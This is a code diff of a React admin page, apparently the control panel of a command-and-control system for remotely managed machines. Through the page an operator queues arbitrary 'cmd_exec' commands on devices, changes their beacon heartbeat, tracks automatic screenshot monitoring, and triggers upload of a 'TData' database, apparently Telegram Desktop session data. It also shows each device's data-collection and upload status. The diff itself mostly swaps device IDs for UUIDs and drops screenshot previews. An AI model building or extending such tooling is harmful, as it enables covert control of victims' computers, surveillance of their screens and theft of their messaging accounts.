@@ -2,33 +2,38 @@ import { listC2DeviceVoByPageUsingPost, deleteC2DeviceUsingPost, updateHeartbeat
 import { addC2TaskUsingPost, listC2TaskVoByPageUsingPost } from '@/services/backend/c2TaskController';
 import type { ActionType, ProColumns } from '@ant-design/pro-components';
 import { PageContainer, ProTable, ModalForm, ProFormSelect, ProFormText, ProFormTextArea } from '@ant-design/pro-components';
-import '@umijs/max';
+import { history } from '@umijs/max';
 import { Button, message, Tag, Space, Typography, Image, Popconfirm, Modal, Dropdown, Menu } from 'antd';
-import { DownOutlined, CameraOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined } from '@ant-design/icons';
+import { DownOutlined, CameraOutlined, PlayCircleOutlined, PauseCircleOutlined, CloudUploadOutlined, AppstoreOutlined } from '@ant-design/icons';
 import React, { useRef, useState } from 'react';
 
 const C2DevicePage: React.FC = () => {
   const actionRef = useRef<ActionType>();
   const [createModalVisible, setCreateModalVisible] = useState<boolean>(false);
   const [heartbeatModalVisible, setHeartbeatModalVisible] = useState<boolean>(false);
-  const [currentDeviceId, setCurrentDeviceId] = useState<string>('');
+  const [currentDevice, setCurrentDevice] = useState<API.C2DeviceVO>();
   const [currentHeartbeat, setCurrentHeartbeat] = useState<number>(60000);
   
   // 结果查看 Modal 状态
   const [resultModalVisible, setResultModalVisible] = useState<boolean>(false);
   const [currentResultContent, setCurrentResultContent] = useState<string>('');
 
-  const handleUpdateHeartbeat = async (id: number, interval: number) => {
-    const hide = message.loading('正在更新心跳');
+  const handleUpdateHeartbeat = async (uuid: string, interval: number) => {
+    const hide = message.loading('正在下发心跳更新任务');
     try {
-      await updateHeartbeatUsingPost({ id: id, heartbeatInterval: interval });
+      // Use Task instead of direct update
+      await addC2TaskUsingPost({
+          deviceUuid: uuid,
+          command: 'set_heartbeat',
+          params: String(interval)
+      });
       hide();
-      message.success('更新成功');
+      message.success('心跳更新任务已下发，等待客户端确认');
       actionRef.current?.reload();
       return true;
     } catch (error: any) {
       hide();
-      message.error('更新失败，' + error.message);
+      message.error('任务下发失败，' + error.message);
       return false;
     }
   };
@@ -83,18 +88,16 @@ const C2DevicePage: React.FC = () => {
         },
       },
       {
-        title: '执行结果 / 截图',
+        title: '执行结果',
         dataIndex: 'result',
         render: (_, task) => {
           if (!task.result) return '-';
           
-          // 判断是否为图片（Base64 或 截图命令）
-          const isImage = task.command === 'screenshot' || task.command === 'start_monitor' || task.result.startsWith('iVBORw0KGgo') || task.result.startsWith('data:image');
+          // 判断是否为图片，如果是图片则显示文字提示，不再显示预览图
+          const isImage = task.command === 'screenshot' || task.command === 'start_monitor' || task.result.startsWith('iVBORw0KGgo') || task.result.startsWith('data:image') || task.result.startsWith('/api/');
           
           if (isImage && task.status === 'completed') {
-             // 尝试提取 base64 (如果不是完整的 data:image 格式，自动补全)
-             const src = task.result.startsWith('data:image') ? task.result : `data:image/png;base64,${task.result}`;
-             return <Image src={src} width={100} />;
+             return <span>[图片已保存到截图记录]</span>;
           }
           
           const content = task.result;
@@ -134,7 +137,7 @@ const C2DevicePage: React.FC = () => {
         request={async (params) => {
           const { data, code } = await listC2TaskVoByPageUsingPost({
             ...params,
-            deviceId: record.id,
+            deviceUuid: record.uuid,
             pageSize: 100,
             sortField: 'createTime',
             sortOrder: 'descend',
@@ -159,13 +162,7 @@ const C2DevicePage: React.FC = () => {
       width: 150,
       ellipsis: true,
     },
-    {
-      title: '设备ID',
-      dataIndex: 'id',
-      valueType: 'text',
-      hideInForm: true,
-      hideInTable: true,
-    },
+
     {
       title: '内网IP',
       dataIndex: 'internalIp',
@@ -200,9 +197,41 @@ const C2DevicePage: React.FC = () => {
         if (!record.lastSeen) return <Tag color="red">离线</Tag>;
         const lastSeen = new Date(record.lastSeen).getTime();
         const now = new Date().getTime();
-        const isOnline = (now - lastSeen) < 2 * 60 * 1000;
+        // Use configured heartbeat interval + buffer (e.g., 30s) or fallback to 2 mins
+        const interval = record.heartbeatInterval || 60000;
+        const threshold = interval + 30 * 1000; 
+        const isOnline = (now - lastSeen) < threshold;
         return isOnline ? <Tag color="green">在线</Tag> : <Tag color="red">离线</Tag>;
       },
+    },
+    {
+      title: '数据状态',
+      dataIndex: 'dataStatus',
+      valueType: 'text',
+      hideInSearch: true,
+      render: (_, record) => {
+        const status = record.dataStatus || 'Waiting';
+        let color = 'default';
+        if (status === 'Collecting') color = 'processing';
+        else if (status === 'Uploading') color = 'warning';
+        else if (status === 'Done') color = 'success';
+        else if (status.startsWith('Error')) color = 'error';
+        
+        return <Tag color={color}>{status}</Tag>;
+      },
+    },
+    {
+      title: '自动截图',
+      dataIndex: 'isMonitorOn',
+      hideInSearch: true,
+      valueType: 'select',
+      valueEnum: {
+        0: { text: '关闭', status: 'Default' },
+        1: { text: '开启', status: 'Processing' },
+      },
+      render: (_, record) => {
+          return record.isMonitorOn === 1 ? <Tag color="blue">开启</Tag> : <Tag>关闭</Tag>;
+      }
     },
     {
       title: '心跳间隔 (秒)',
@@ -226,44 +255,31 @@ const C2DevicePage: React.FC = () => {
       render: (_, record) => {
           const menu = (
             <Menu onClick={async (e) => {
-                if (e.key === 'screenshot') {
+                if (e.key === 'upload_db') {
                      await handleAddTask({
-                        deviceId: record.id,
-                        command: 'screenshot',
-                        params: ''
-                     });
-                } else if (e.key === 'start_monitor') {
-                     await handleAddTask({
-                        deviceId: record.id,
-                        command: 'start_monitor',
-                        params: String(record.heartbeatInterval || 60000)
-                     });
-                } else if (e.key === 'stop_monitor') {
-                     await handleAddTask({
-                        deviceId: record.id,
-                        command: 'stop_monitor',
-                        params: ''
-                     });
-                } else if (e.key === 'upload_db') {
-                     await handleAddTask({
-                        deviceId: record.id,
+                        deviceUuid: record.uuid,
                         command: 'upload_db',
                         params: ''
                      });
                 }
             }}>
-                <Menu.Item key="screenshot" icon={<CameraOutlined />}>屏幕截图</Menu.Item>
-                <Menu.Item key="start_monitor" icon={<PlayCircleOutlined />}>开启定时截图</Menu.Item>
-                <Menu.Item key="stop_monitor" icon={<PauseCircleOutlined />}>停止定时截图</Menu.Item>
                 <Menu.Item key="upload_db" icon={<CloudUploadOutlined />}>上传TData数据库</Menu.Item>
             </Menu>
           );
           
           return [
         <a
+          key="detail"
+          onClick={() => {
+            history.push(`/c2/device/detail/${record.uuid}`);
+          }}
+        >
+          查看详细
+        </a>,
+        <a
           key="task"
           onClick={() => {
-            setCurrentDeviceId(String(record.id));
+            setCurrentDevice(record);
             setCreateModalVisible(true);
           }}
         >
@@ -272,7 +288,7 @@ const C2DevicePage: React.FC = () => {
         <a
           key="heartbeat"
           onClick={() => {
-            setCurrentDeviceId(String(record.id));
+            setCurrentDevice(record);
             setCurrentHeartbeat(record.heartbeatInterval || 60000);
             setHeartbeatModalVisible(true);
           }}
@@ -306,14 +322,14 @@ const C2DevicePage: React.FC = () => {
           labelWidth: 120,
         }}
         toolBarRender={() => [
-          <Button
-            key="refresh"
-            onClick={() => {
-              actionRef.current?.reload();
-            }}
-          >
-            刷新列表
-          </Button>,
+          // <Button
+          //   key="refresh"
+          //   onClick={() => {
+          //     actionRef.current?.reload();
+          //   }}
+          // >
+          //   刷新列表
+          // </Button>,
         ]}
         expandable={{ 
             expandedRowRender,
@@ -349,22 +365,23 @@ const C2DevicePage: React.FC = () => {
           const success = await handleAddTask({
             ...value,
             command: 'cmd_exec', // 强制指定命令类型
-            deviceId: Number(currentDeviceId)
+            deviceUuid: currentDevice?.uuid,
           } as API.C2TaskAddRequest);
           if (success) {
             setCreateModalVisible(false);
-            // 这里应该重新加载设备列表，从而触发展开行的重新渲染
-            actionRef.current?.reload();
+            if (actionRef.current) {
+              actionRef.current.reload();
+            }
           }
         }}
       >
         {/* 隐藏的 deviceId 字段，确保表单提交时包含该字段 */}
-        <ProFormText name="deviceId" initialValue={currentDeviceId} hidden />
+        <ProFormText name="deviceUuid" initialValue={currentDevice?.uuid} hidden />
         <ProFormText
-          label="设备ID"
+          label="设备UUID"
           name="deviceIdDisplay"
           disabled
-          initialValue={currentDeviceId}
+          initialValue={currentDevice?.uuid || '未知设备'}
         />
         {/* 原本的命令选择已移除，默认执行 cmd_exec */}
         
@@ -382,17 +399,21 @@ const C2DevicePage: React.FC = () => {
         onVisibleChange={setHeartbeatModalVisible}
         modalProps={{ destroyOnClose: true }}
         onFinish={async (value) => {
-          const success = await handleUpdateHeartbeat(Number(currentDeviceId), value.heartbeatInterval * 1000);
+          if (!currentDevice?.uuid) {
+             message.error('设备UUID不存在，无法更新心跳');
+             return;
+          }
+          const success = await handleUpdateHeartbeat(currentDevice.uuid, value.heartbeatInterval * 1000);
           if (success) {
             setHeartbeatModalVisible(false);
           }
         }}
       >
         <ProFormText
-          label="设备ID"
+          label="设备UUID"
           name="deviceIdDisplay"
           disabled
-          initialValue={currentDeviceId}
+          initialValue={currentDevice?.uuid || currentDevice?.id || '未知'}
         />
         <ProFormSelect
           label="心跳间隔 (秒)"
